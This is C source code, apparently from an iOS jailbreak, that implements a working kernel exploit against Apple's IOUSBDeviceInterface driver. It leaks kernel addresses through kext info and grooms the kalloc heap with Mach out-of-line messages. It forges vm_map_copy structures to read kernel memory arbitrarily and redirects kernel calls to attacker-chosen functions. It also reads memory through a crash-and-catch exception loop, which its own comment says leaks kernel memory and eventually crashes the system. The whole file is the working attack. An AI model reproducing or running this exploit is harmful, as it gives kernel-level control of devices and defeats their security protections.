#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <stdint.h>
#include <mach/mach.h>
#include <mach-o/loader.h>
#include <mach/exc.h>
#include <mach/thread_status.h>
#include <pthread.h>

#include "exploit.h"
#include "deadman.h"
#include "kiki-log.h"

#ifdef DEADMAN_LOGGING
#define DEADMAN_ACTIVATE(timeout) { jb_log("activate %s", __func__); deadman_activate(timeout); }
#define DEADMAN_DEACTIVATE() { jb_log("deactivate %s", __func__); deadman_deactivate(); }
#else
#define DEADMAN_ACTIVATE(timeout) deadman_activate(timeout)
#define DEADMAN_DEACTIVATE() deadman_deactivate()
#endif

// 872c93c8b030d179ac97b84d1963f2860580ef9c = SHA1 of comexkkxemoc (secret credit for IOUSBDeviceInterface bug)

/////////////////////////////////////// Public Kernel Addresses from IOKit ///////////////////////////////////////
static uint32_t UnslidKernelRegion = 0;
static uint32_t KernelTextStart = 0;
static uint32_t IOUSBStart = 0;

CFDictionaryRef OSKextCopyLoadedKextInfo(CFArrayRef kextIdentifiers, CFArrayRef infoKeys);
static void get_kernel_info_from_iokit()
{
    CFStringRef kernel = CFSTR("__kernel__");
    CFStringRef iousb = CFSTR("com.apple.iokit.IOUSBDeviceFamily");
    CFStringRef headers = CFSTR("OSBundleMachOHeaders");
    const void* bundleValues[] = { kernel, iousb };
    const void* headerValues[] = { headers };
    CFArrayRef bundleIDs = CFArrayCreate(NULL, bundleValues, 2, &kCFTypeArrayCallBacks);
    CFArrayRef infoKeys = CFArrayCreate(NULL, headerValues, 1, &kCFTypeArrayCallBacks);
    CFDictionaryRef info = OSKextCopyLoadedKextInfo(bundleIDs, infoKeys);
    struct mach_header* kernel_header = (struct mach_header*)CFDataGetBytePtr(CFDictionaryGetValue(CFDictionaryGetValue(info, kernel), headers));
    struct mach_header* iousb_header = (struct mach_header*)CFDataGetBytePtr(CFDictionaryGetValue(CFDictionaryGetValue(info, iousb), headers));

    struct load_command* command;
    uint32_t i;

    UnslidKernelRegion = 0;
    KernelTextStart = 0;
    IOUSBStart = 0;

    command = (struct load_command*)((uintptr_t)kernel_header + sizeof(struct mach_header));
    for(i = 0; i < kernel_header->ncmds; ++i)
    {
        if(command->cmd == LC_SEGMENT)
        {
            struct segment_command* segment = (struct segment_command*)command;
            if(strcmp("__TEXT", segment->segname) == 0)
            {
                UnslidKernelRegion = segment->vmaddr & 0xFFFF0000;

                struct section* section = (struct section*)(segment + 1);
                uint32_t j;
                for(j = 0; j < segment->nsects; ++j)
                {
                    if(strcmp("__text", section[j].sectname) == 0)
                    {
                        KernelTextStart = (section[j].addr - UnslidKernelRegion) & 0xFFFF;
                        break;
                    }
                }

                if(KernelTextStart)
                    break;
            }
        }

        command = (struct load_command*)((uintptr_t)command + command->cmdsize);
    }

    command = (struct load_command*)((uintptr_t)iousb_header + sizeof(struct mach_header));
    for(i = 0; i < kernel_header->ncmds; ++i)
    {
        if(command->cmd == LC_SEGMENT)
        {
            struct segment_command* segment = (struct segment_command*)command;
            if(strcmp("__TEXT", segment->segname) == 0)
            {
                IOUSBStart = segment->vmaddr;
                break;
            }
        }

        command = (struct load_command*)((uintptr_t)command + command->cmdsize);
    }


    CFRelease(bundleIDs);
    CFRelease(infoKeys);
    CFRelease(info);
}

static uint32_t get_unslid_kernel_region()
{
    if(UnslidKernelRegion)
        return UnslidKernelRegion;

    get_kernel_info_from_iokit();
    return UnslidKernelRegion;
}

uint32_t get_kernel_text_start()
{
    if(KernelTextStart)
        return KernelTextStart;

    get_kernel_info_from_iokit();
    return KernelTextStart;
}

static uint32_t get_iousb_start()
{
    if(IOUSBStart)
        return IOUSBStart;

    get_kernel_info_from_iokit();
    return IOUSBStart;
}

///////////////////////////////////////           Kernel Exploit           ///////////////////////////////////////

// Tuneable options
#define OOL_DESCRIPTORS 20                                  /* We overshoot a bit. We only need 2 */
#define NUM_BUFFERS_TO_LOOK_AHEAD 10                        /* This allows us to grab a buffer even if someone alloc'ed between the time we do IOUSBDeviceInterface::createData and mach_msg */
#define NUM_CONSECUTIVE_BUFFERS_TO_LOOK_FOR 10              /* Number of consecutive kalloc buffers from IOUSBDeviceInterface::createData before we're confident the next allocs will also be consecutive */

// Based on kernel behavior
#define SIZE_OF_VM_MAP_COPY_T 0x30
#define SIZE_OF_KALLOC_BUFFER 0x58
#define NUM_ALLOCATIONS_PER_CALL 2

// Calculated
#define FIRST_ARG_INDEX 4
#define KERNEL_BUFFER_SIZE (SIZE_OF_KALLOC_BUFFER - SIZE_OF_VM_MAP_COPY_T)
#define KERNEL_READ_SECTION_SIZE (KERNEL_BUFFER_SIZE - (FIRST_ARG_INDEX * sizeof(uint32_t)))

static mach_port_t MachServerPort = 0;
static uint32_t KernelBufferAddress = 0;
static int KernelBufferIndex = -1;

static kern_return_t iousb_create_data(io_connect_t connect, uint64_t size, void** address, uint64_t* sizeOut, uint32_t* token)
{
    uint64_t output[3];
    uint32_t outputCount = 3;

    uint64_t args[] = { size };

    kern_return_t ret = IOConnectCallScalarMethod(connect, 18, args, 1, output, &outputCount);
    if(ret == KERN_SUCCESS)
    {
        *address = (void*) (uintptr_t) output[0];
        *sizeOut = output[1];
        *token = (uint32_t) output[2];
    }

    return ret;
}

static uint32_t allocate_kalloc_88(io_connect_t connect)
{
    void* address = NULL;
    uint64_t size = 0;
    uint32_t token = 0;
    kern_return_t ret = iousb_create_data(connect, 1024, &address, &size, &token);
    if(ret != KERN_SUCCESS)
        return 0;

    return token;
}

static void setup_kernel_well_known_address(io_connect_t connect)
{
    DEADMAN_ACTIVATE(5);

    KernelBufferAddress = 0;
    KernelBufferIndex = -1;

    if(MachServerPort)
    {
        mach_port_deallocate(mach_task_self(), MachServerPort);
        MachServerPort = 0;
    }

    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &MachServerPort);

    struct
    {
        mach_msg_header_t header;
        mach_msg_body_t body;
        mach_msg_ool_descriptor_t descriptors[OOL_DESCRIPTORS];
    } msg;

    uint8_t buffer[KERNEL_BUFFER_SIZE];

    msg.header.msgh_remote_port = MachServerPort;
    msg.header.msgh_local_port = MACH_PORT_NULL;
    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND | MACH_MSGH_BITS_COMPLEX, 0);
    msg.header.msgh_size = sizeof(msg);
    msg.body.msgh_descriptor_count = OOL_DESCRIPTORS;

    int i;
    for(i = 0; i < OOL_DESCRIPTORS; ++i)
    {
        msg.descriptors[i].address = buffer;
        msg.descriptors[i].size = sizeof(buffer);
        msg.descriptors[i].deallocate = 0;
        msg.descriptors[i].copy = MACH_MSG_PHYSICAL_COPY;
        msg.descriptors[i].type = MACH_MSG_OOL_DESCRIPTOR;
    }

    uint32_t lastAddress = 0;
    uint32_t consecutiveCount = 0;
    while(1)
    {
        uint32_t curAddress = allocate_kalloc_88(connect);
        if((lastAddress - curAddress) == (SIZE_OF_KALLOC_BUFFER * NUM_ALLOCATIONS_PER_CALL) && (OOL_DESCRIPTORS * SIZE_OF_KALLOC_BUFFER) <= (lastAddress & 0xFFF))
        {
            ++consecutiveCount;
            if(consecutiveCount == NUM_CONSECUTIVE_BUFFERS_TO_LOOK_FOR)
            {
                lastAddress = curAddress;
                break;
            }
        } else
        {
            consecutiveCount = 0;
        }
        lastAddress = curAddress;
    }

    mach_msg(&msg.header, MACH_SEND_MSG, msg.header.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    KernelBufferAddress = lastAddress - (SIZE_OF_KALLOC_BUFFER * NUM_BUFFERS_TO_LOOK_AHEAD) + SIZE_OF_VM_MAP_COPY_T;

    DEADMAN_DEACTIVATE();
}

static void write_kernel_known_address(io_connect_t connect, void* buffer)
{
    DEADMAN_ACTIVATE(5);

    if(!KernelBufferAddress)
        setup_kernel_well_known_address(connect);

    struct
    {
        mach_msg_header_t header;
        mach_msg_body_t body;
        mach_msg_ool_descriptor_t descriptors[OOL_DESCRIPTORS];
        mach_msg_trailer_t trailer;
    } recv_msg;

    struct
    {
        mach_msg_header_t header;
        mach_msg_body_t body;
        mach_msg_ool_descriptor_t descriptors[OOL_DESCRIPTORS];
    } msg;

    msg.header.msgh_remote_port = MachServerPort;
    msg.header.msgh_local_port = MACH_PORT_NULL;
    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND | MACH_MSGH_BITS_COMPLEX, 0);
    msg.header.msgh_size = sizeof(msg);
    msg.body.msgh_descriptor_count = OOL_DESCRIPTORS;

    int i;
    for(i = 0; i < OOL_DESCRIPTORS; ++i)
    {
        msg.descriptors[i].address = buffer;
        msg.descriptors[i].size = KERNEL_BUFFER_SIZE;
        msg.descriptors[i].deallocate = 0;
        msg.descriptors[i].copy = MACH_MSG_PHYSICAL_COPY;
        msg.descriptors[i].type = MACH_MSG_OOL_DESCRIPTOR;
    }

    mach_msg(&recv_msg.header, MACH_RCV_MSG, 0, sizeof(recv_msg), MachServerPort, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    mach_msg(&msg.header, MACH_SEND_MSG, msg.header.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    for(i = 0; i < OOL_DESCRIPTORS; ++i)
    {
        vm_deallocate(mach_task_self(), (vm_address_t)recv_msg.descriptors[i].address, recv_msg.descriptors[i].size);
    }

    DEADMAN_DEACTIVATE();
}

static void find_kernel_buffer_index(io_connect_t connect, uint32_t memmove)
{
    DEADMAN_ACTIVATE(5);

    if(!KernelBufferAddress)
        setup_kernel_well_known_address(connect);

    uint32_t fn = get_kernel_region(connect) + memmove;

    struct
    {
        mach_msg_header_t header;
        mach_msg_body_t body;
        mach_msg_ool_descriptor_t descriptors[OOL_DESCRIPTORS];
        mach_msg_trailer_t trailer;
    } recv_msg;

    struct
    {
        mach_msg_header_t header;
        mach_msg_body_t body;
        mach_msg_ool_descriptor_t descriptors[OOL_DESCRIPTORS];
    } msg;

    uint8_t dummy[KERNEL_BUFFER_SIZE];

    msg.header.msgh_remote_port = MachServerPort;
    msg.header.msgh_local_port = MACH_PORT_NULL;
    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND | MACH_MSGH_BITS_COMPLEX, 0);
    msg.header.msgh_size = sizeof(msg);
    msg.body.msgh_descriptor_count = OOL_DESCRIPTORS;

    int i;
    for(i = 0; i < OOL_DESCRIPTORS; ++i)
    {
        msg.descriptors[i].address = dummy;
        msg.descriptors[i].size = KERNEL_BUFFER_SIZE;
        msg.descriptors[i].deallocate = 0;
        msg.descriptors[i].copy = MACH_MSG_PHYSICAL_COPY;
        msg.descriptors[i].type = MACH_MSG_OOL_DESCRIPTOR;
    }

    call_direct(connect, fn, 0xffff0000, KERNEL_READ_SECTION_SIZE);
    mach_msg(&recv_msg.header, MACH_RCV_MSG, 0, sizeof(recv_msg), MachServerPort, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    mach_msg(&msg.header, MACH_SEND_MSG, msg.header.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    if(KernelBufferIndex == -1)
    {
        if(memcmp(recv_msg.descriptors[0].address, recv_msg.descriptors[1].address, KERNEL_BUFFER_SIZE) != 0)
        {
            if(memcmp(recv_msg.descriptors[0].address, recv_msg.descriptors[OOL_DESCRIPTORS - 1].address, KERNEL_BUFFER_SIZE) == 0)
            {
                KernelBufferIndex = 1;
            } else
            {
                KernelBufferIndex = 0;
            }
        } else
        {
            for(i = 2; i < OOL_DESCRIPTORS; ++i)
            {
                if(memcmp(recv_msg.descriptors[0].address, recv_msg.descriptors[i].address, KERNEL_BUFFER_SIZE) != 0)
                {
                    KernelBufferIndex = i;
                    break;
                }
            }
        }
    }

    for(i = 0; i < OOL_DESCRIPTORS; ++i)
    {
        vm_deallocate(mach_task_self(), (vm_address_t)recv_msg.descriptors[i].address, recv_msg.descriptors[i].size);
    }

    DEADMAN_DEACTIVATE();
}

static uint32_t region_size(void* address)
{
    kern_return_t err;
    vm_address_t addr = (vm_address_t) address;
    vm_size_t size;
    int vminfo[VM_REGION_BASIC_INFO_COUNT_64];
    mach_msg_type_number_t len = sizeof(vminfo);
    mach_port_t obj;

    err = vm_region_64(mach_task_self(), &addr, &size, VM_REGION_BASIC_INFO, (vm_region_info_t) &vminfo, &len, &obj);
    if(err != KERN_SUCCESS)
        return 0;

    if(addr <= (vm_address_t)address && (vm_address_t)address < (addr + size))
        return size;

    return 0;
}

int _kernel_read_small(io_connect_t connect, uint32_t memmove, uint32_t address, void* buffer, uint32_t size)
{
    if(!KernelBufferAddress)
        setup_kernel_well_known_address(connect);

    uint32_t fn = get_kernel_region(connect) + memmove;

    struct
    {
        mach_msg_header_t header;
        mach_msg_body_t body;
        mach_msg_ool_descriptor_t descriptors[OOL_DESCRIPTORS];
        mach_msg_trailer_t trailer;
    } recv_msg;

    struct
    {
        mach_msg_header_t header;
        mach_msg_body_t body;
        mach_msg_ool_descriptor_t descriptors[OOL_DESCRIPTORS];
    } msg;

    uint8_t dummy[KERNEL_BUFFER_SIZE];

    msg.header.msgh_remote_port = MachServerPort;
    msg.header.msgh_local_port = MACH_PORT_NULL;
    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND | MACH_MSGH_BITS_COMPLEX, 0);
    msg.header.msgh_size = sizeof(msg);
    msg.body.msgh_descriptor_count = OOL_DESCRIPTORS;

    int i;
    for(i = 0; i < OOL_DESCRIPTORS; ++i)
    {
        msg.descriptors[i].address = dummy;
        msg.descriptors[i].size = KERNEL_BUFFER_SIZE;
        msg.descriptors[i].deallocate = 0;
        msg.descriptors[i].copy = MACH_MSG_PHYSICAL_COPY;
        msg.descriptors[i].type = MACH_MSG_OOL_DESCRIPTOR;
    }

    uint32_t table[10];
    table[0] = KernelBufferAddress + (sizeof(uint32_t) * 3);
    table[1] = KernelBufferAddress + (sizeof(uint32_t) * FIRST_ARG_INDEX);
    table[2] = address;
    table[3] = KernelBufferAddress + (sizeof(uint32_t) * 2) - (209 * sizeof(uint32_t));
    table[FIRST_ARG_INDEX] = KernelBufferAddress - (sizeof(uint32_t) * 23);
    table[5] = fn;
    table[6] = size;
    table[7] = 0xdeadc0de;
    table[8] = 1;
    table[9] = 0xdeadc0de;

    uint64_t args[] = {(uint64_t) (uintptr_t) (KernelBufferAddress - (sizeof(uint32_t) * 2))};

    write_kernel_known_address(connect, table);
    IOConnectCallScalarMethod(connect, 15, args, 1, NULL, NULL);

    mach_msg(&recv_msg.header, MACH_RCV_MSG, 0, sizeof(recv_msg), MachServerPort, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    mach_msg(&msg.header, MACH_SEND_MSG, msg.header.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    int ret = 0;
    for(i = 0; i < OOL_DESCRIPTORS; ++i)
    {
        if(recv_msg.descriptors[i].address)
        {
            if(memcmp(recv_msg.descriptors[i].address, table, sizeof(table)) != 0)
            {
                void* start = (void*)((uintptr_t)recv_msg.descriptors[i].address + (FIRST_ARG_INDEX * sizeof(uint32_t)));
                memcpy(buffer, start, size);
                ret = 1;
            }
            vm_deallocate(mach_task_self(), (vm_address_t)recv_msg.descriptors[i].address, recv_msg.descriptors[i].size);
        }
    }

    return ret;
}

struct vm_map_copy
{
    int type;
#define VM_MAP_COPY_ENTRY_LIST 1
#define VM_MAP_COPY_OBJECT 2
#define VM_MAP_COPY_KERNEL_BUFFER 3
    uint64_t offset;
    uint32_t size;
    struct
    {
        void* kdata;
        uint32_t kalloc_size;
    } c_k;
};

int _kernel_read(io_connect_t connect, uint32_t memmove, uint32_t address, void* buffer, uint32_t size)
{

    uint32_t fn = get_kernel_region(connect) + memmove;

    // Just do  this every single time. Seems to increase reliability.
    setup_kernel_well_known_address(connect);
    find_kernel_buffer_index(connect, memmove);

    struct vm_map_copy fake;
    fake.type = VM_MAP_COPY_KERNEL_BUFFER;
    fake.offset = 0;
    fake.size = size;
    fake.c_k.kdata = (void*) address;

    uint32_t table[10];
    table[0] = KernelBufferAddress + (sizeof(uint32_t) * 3);
    table[1] = KernelBufferAddress + (sizeof(uint32_t) * FIRST_ARG_INDEX);
    // Target the buffer in KernelBufferIndex + 1 for copying from. Take into account the fact that we want to start copying KERNEL_READ_SECTION_SIZE before our actual data so that our actual data will end up in the next vm_map_copy_t
    table[2] = (KernelBufferAddress - SIZE_OF_VM_MAP_COPY_T) - SIZE_OF_KALLOC_BUFFER + SIZE_OF_VM_MAP_COPY_T - KERNEL_READ_SECTION_SIZE;
    table[3] = KernelBufferAddress + (sizeof(uint32_t) * 2) - (209 * sizeof(uint32_t));
    table[FIRST_ARG_INDEX] = KernelBufferAddress - (sizeof(uint32_t) * 23);
    table[5] = fn;
    // This will overwrite up to and including kdata in KernelBufferIndex - 1's vm_map_copy_t
    table[6] = KERNEL_READ_SECTION_SIZE + __builtin_offsetof(struct vm_map_copy, c_k.kdata) + sizeof(fake.c_k.kdata);
    table[7] = 0x872c93c8;
    table[8] = 1;
    table[9] = 0xb030d179;

    uint8_t fake_data[KERNEL_BUFFER_SIZE];
    memcpy(fake_data, &fake, sizeof(fake));

    uint64_t args[] = {(uint64_t) (uintptr_t) (KernelBufferAddress - (sizeof(uint32_t) * 2))};

    // This is the same as write_kernel_known_address except we put the fake vm_map_copy_t data in KernelBufferIndex + 1.
    struct
    {
        mach_msg_header_t header;
        mach_msg_body_t body;
        mach_msg_ool_descriptor_t descriptors[OOL_DESCRIPTORS];
        mach_msg_trailer_t trailer;
    } recv_msg;

    struct
    {
        mach_msg_header_t header;
        mach_msg_body_t body;
        mach_msg_ool_descriptor_t descriptors[OOL_DESCRIPTORS];
    } msg;

    msg.header.msgh_remote_port = MachServerPort;
    msg.header.msgh_local_port = MACH_PORT_NULL;
    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND | MACH_MSGH_BITS_COMPLEX, 0);
    msg.header.msgh_size = sizeof(msg);
    msg.body.msgh_descriptor_count = OOL_DESCRIPTORS;

    int i;
    for(i = 0; i < OOL_DESCRIPTORS; ++i)
    {
        if(i == (KernelBufferIndex + 1))
            msg.descriptors[i].address = fake_data;
        else
            msg.descriptors[i].address = table;
        msg.descriptors[i].size = KERNEL_BUFFER_SIZE;
        msg.descriptors[i].deallocate = 0;
        msg.descriptors[i].copy = MACH_MSG_PHYSICAL_COPY;
        msg.descriptors[i].type = MACH_MSG_OOL_DESCRIPTOR;
    }

    mach_msg(&recv_msg.header, MACH_RCV_MSG, 0, sizeof(recv_msg), MachServerPort, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    mach_msg(&msg.header, MACH_SEND_MSG, msg.header.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    IOConnectCallScalarMethod(connect, 15, args, 1, NULL, NULL);

    for(i = 0; i < OOL_DESCRIPTORS; ++i)
    {
        vm_deallocate(mach_task_self(), (vm_address_t)recv_msg.descriptors[i].address, recv_msg.descriptors[i].size);
    }

    mach_msg(&recv_msg.header, MACH_RCV_MSG, 0, sizeof(recv_msg), MachServerPort, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    mach_msg(&msg.header, MACH_SEND_MSG, msg.header.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    int ret = 0;
    for(i = 0; i < OOL_DESCRIPTORS; ++i)
    {
        if(i == (KernelBufferIndex - 1))
        {
            if(recv_msg.descriptors[i].address && region_size(recv_msg.descriptors[i].address) >= size)
            {
                // Detect if we've accidentally matched one of the buffers at KernelBufferIndex + 1 (fake_data), KernelBufferIndex (filled with table's data up to FIRST_ARG_INDEX), or others (filled with table data entirely).
                if(memcmp(recv_msg.descriptors[i].address, table, sizeof(uint32_t) * FIRST_ARG_INDEX) != 0 && memcmp(recv_msg.descriptors[i].address, fake_data, sizeof(fake_data)) != 0)
                {
                    memcpy(buffer, recv_msg.descriptors[i].address, size);
                    ret = 1;
                }
                vm_deallocate(mach_task_self(), (vm_address_t)recv_msg.descriptors[i].address, size);
            }
        } else
        {
            vm_deallocate(mach_task_self(), (vm_address_t)recv_msg.descriptors[i].address, recv_msg.descriptors[i].size);
        }
    }

    return ret;
}

int kernel_read(io_connect_t connect, uint32_t memmove, uint32_t address, void* buffer, uint32_t size)
{
    DEADMAN_ACTIVATE(5);

    if(size <= KERNEL_READ_SECTION_SIZE)
    {
        while(!_kernel_read_small(connect, memmove, address, buffer, size))
        {
            // Something went wrong. Try again.
            setup_kernel_well_known_address(connect);
            find_kernel_buffer_index(connect, memmove);
        }
    } else
    {
        while(!_kernel_read(connect, memmove, address, buffer, size))
        {
            // Something went wrong. Recalculate KernelBufferIndex and try again.
            setup_kernel_well_known_address(connect);
            find_kernel_buffer_index(connect, memmove);
        }
    }

    DEADMAN_DEACTIVATE();

    return 1;
}

void call_direct(io_connect_t connect, uint32_t fn, uint32_t arg1, uint32_t arg2)
{
    DEADMAN_ACTIVATE(5);

    if(!KernelBufferAddress)
        setup_kernel_well_known_address(connect);

    uint32_t table[10];
    table[0] = KernelBufferAddress + (sizeof(uint32_t) * 3);
    table[1] = KernelBufferAddress + (sizeof(uint32_t) * FIRST_ARG_INDEX);
    table[2] = arg1;
    table[3] = KernelBufferAddress + (sizeof(uint32_t) * 2) - (209 * sizeof(uint32_t));
    table[FIRST_ARG_INDEX] = KernelBufferAddress - (sizeof(uint32_t) * 23);
    table[5] = fn;
    table[6] = arg2;
    table[7] = 0xac97b84d;
    table[8] = 1;
    table[9] = 0x1963f286;

    uint64_t args[] = {(uint64_t) (uintptr_t) (KernelBufferAddress - (sizeof(uint32_t) * 2))};

    write_kernel_known_address(connect, table);
    IOConnectCallScalarMethod(connect, 15, args, 1, NULL, NULL);

    DEADMAN_DEACTIVATE();
}

void _call_indirect(io_connect_t connect, uint32_t fn, uint32_t arg1_address, uint32_t arg2, int deadman)
{
    if(deadman)
        DEADMAN_ACTIVATE(5);

    if(!KernelBufferAddress)
        setup_kernel_well_known_address(connect);

    uint32_t table[10];
    table[0] = KernelBufferAddress + (sizeof(uint32_t) * 3);
    table[1] = KernelBufferAddress + (sizeof(uint32_t) * FIRST_ARG_INDEX);
    table[2] = 0x0580ef9c;
    table[3] = arg1_address - (209 * sizeof(uint32_t));
    table[FIRST_ARG_INDEX] = KernelBufferAddress - (sizeof(uint32_t) * 23);
    table[5] = fn;
    table[6] = arg2;
    table[7] = 0xdeadc0de;
    table[8] = 1;
    table[9] = 0xdeadc0de;

    uint64_t args[] = {(uint64_t) (uintptr_t) (KernelBufferAddress - (sizeof(uint32_t) * 2))};

    write_kernel_known_address(connect, table);
    IOConnectCallScalarMethod(connect, 15, args, 1, NULL, NULL);

    if(deadman)
        DEADMAN_DEACTIVATE();
}

void call_indirect(io_connect_t connect, uint32_t fn, uint32_t arg1_address, uint32_t arg2)
{
    return _call_indirect(connect, fn, arg1_address, arg2, 1);
}

///////////////////////////////////////         Kernel Read-Anywhere       ///////////////////////////////////////

extern boolean_t exc_server(mach_msg_header_t *, mach_msg_header_t *);

struct readdword_context
{
    pthread_mutex_t started_mutex;
    pthread_cond_t started_condition;
    pthread_cond_t mach_thread_set_condition;
    thread_t mach_thread;
    volatile int started;
    uint32_t stack;
    io_connect_t connect;
    uint32_t start_address;
    uint32_t cur_address;
    uint32_t end_address;
    uint32_t crash_pc;
};

static struct readdword_context Context;
static void* Buffer;
static volatile int Running;

static void do_crash(void* arg)
{
    struct readdword_context* context = (struct readdword_context*)arg;
    _call_indirect(context->connect, 0xFFFF0010, context->cur_address, 0x1234, 0);
}

static void do_thread_end()
{
    pthread_exit(NULL);
}

static void do_crash_thread_start(void* arg)
{
    struct readdword_context* context = (struct readdword_context*)arg;
    pthread_mutex_lock(&context->started_mutex);
    context->mach_thread = mach_thread_self();
    pthread_cond_signal(&context->mach_thread_set_condition);
    while(!context->started)
        pthread_cond_wait(&context->started_condition, &context->started_mutex);
    pthread_mutex_unlock(&context->started_mutex);
    do_crash(arg);
}

kern_return_t catch_exception_raise_state_identity(
        mach_port_t exception_port,
        mach_port_t thread,
        mach_port_t task,
        exception_type_t exception,
        exception_data_t code,
        mach_msg_type_number_t codeCnt,
        int *flavor,
        thread_state_t old_state,
        mach_msg_type_number_t old_stateCnt,
        thread_state_t new_state,
        mach_msg_type_number_t *new_stateCnt)
{
    arm_thread_state_t* arm_old_state = (arm_thread_state_t*) old_state;
    arm_thread_state_t* arm_new_state = (arm_thread_state_t*) new_state;

    *(uint32_t*)(Buffer + (Context.cur_address - Context.start_address)) = arm_old_state->__r[1];
    Context.crash_pc = arm_old_state->__pc;

    Context.cur_address += 4;

    memset(arm_new_state, 0, sizeof(*arm_new_state));
    arm_new_state->__sp = Context.stack;
    arm_new_state->__cpsr = 0x30;

    if(Context.cur_address < Context.end_address)
    {
        arm_new_state->__r[0] = (uintptr_t)&Context;
        arm_new_state->__pc = ((uintptr_t)do_crash) & ~1;
    } else
    {
        arm_new_state->__pc = ((uintptr_t)do_thread_end) & ~1;
        Running = 0;
    }

    *new_stateCnt = sizeof(*arm_new_state);

    deadman_reset(5);
    return KERN_SUCCESS;
}

// This method is slow and results in a kernel memory leak that will eventually crash the system, so it can't be used for everything.
uint8_t* _kernel_read_exception_vector2(io_connect_t connect, uint32_t start, uint32_t size, uint32_t* crash_pc)
{
    uint32_t stack_size = 10 * 1024 * 1024;
    uint8_t* stack = malloc(stack_size);
    Buffer = malloc(size);

    DEADMAN_ACTIVATE(5);

    pthread_mutex_init(&Context.started_mutex, NULL);
    pthread_cond_init(&Context.started_condition, NULL);
    pthread_cond_init(&Context.mach_thread_set_condition, NULL);
    Context.mach_thread = MACH_PORT_NULL;
    Context.started = 0;
    Context.stack = ((uintptr_t)stack) + stack_size;
    Context.connect = connect;
    Context.start_address = start;
    Context.cur_address = start;
    Context.end_address = start + size;
    Context.crash_pc = 0;

    pthread_t thread;
    pthread_create(&thread, NULL, (void*)do_crash_thread_start, &Context);

    pthread_mutex_lock(&Context.started_mutex);
    while(!Context.mach_thread)
        pthread_cond_wait(&Context.mach_thread_set_condition, &Context.started_mutex);
    pthread_mutex_unlock(&Context.started_mutex);

    mach_port_t exc;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exc);
    mach_port_insert_right(mach_task_self(), exc, exc, MACH_MSG_TYPE_MAKE_SEND);
    thread_set_exception_ports(Context.mach_thread, EXC_MASK_BAD_ACCESS | EXC_MASK_BAD_INSTRUCTION, exc, EXCEPTION_STATE_IDENTITY, ARM_THREAD_STATE);

    pthread_mutex_lock(&Context.started_mutex);
    Context.started = 1;
    pthread_cond_signal(&Context.started_condition);
    pthread_mutex_unlock(&Context.started_mutex);

    Running = 1;

    int success = 1;
    while(Running)
    {
        mach_msg_server_once(exc_server, sizeof(__Reply__exception_raise_state_identity_t), exc, MACH_RCV_TIMEOUT);

        if(!Running)
            break;

        mach_port_type_t type = 0;
        mach_port_type(mach_task_self(), Context.mach_thread, &type);
        if(type == MACH_PORT_TYPE_DEAD_NAME)
        {
            // Our thread died without sending up an exception. This sometimes happens when setup_kernel_well_known_address fails,
            // leading stallPipe to do nothing instead of crashing.
            success = 0;
            break;
        }
    }

    DEADMAN_DEACTIVATE();

    mach_port_deallocate(mach_task_self(), exc);

    pthread_join(thread, NULL);

    free(stack);

    if(crash_pc)
        *crash_pc = Context.crash_pc;

    if(!success)
    {
        free(Buffer);
        Buffer = NULL;
        return NULL;
    }

    return Buffer;
}

uint8_t* kernel_read_exception_vector2(io_connect_t connect, uint32_t start, uint32_t size, uint32_t* crash_pc)
{
    uint8_t* buffer;
    while((buffer = _kernel_read_exception_vector2(connect, start, size, crash_pc)) == NULL)
    {
        // Try again if we fail.
        setup_kernel_well_known_address(connect);
    }

    return buffer;
}

uint8_t* kernel_read_exception_vector(io_connect_t connect, uint32_t start, uint32_t size)
{
    return kernel_read_exception_vector2(connect, start, size, NULL);
}

uint32_t get_kernel_region(io_connect_t connect)
{
    static uint32_t region = 0;
    if(region)
        return region;

    uint32_t crash_pc = 0;
    uint8_t* unused = kernel_read_exception_vector2(connect, 0xffff0000, 4, &crash_pc);
    free(unused);

    region = get_unslid_kernel_region() + ((crash_pc - get_iousb_start()) & 0xFFF00000);
    return region;
}
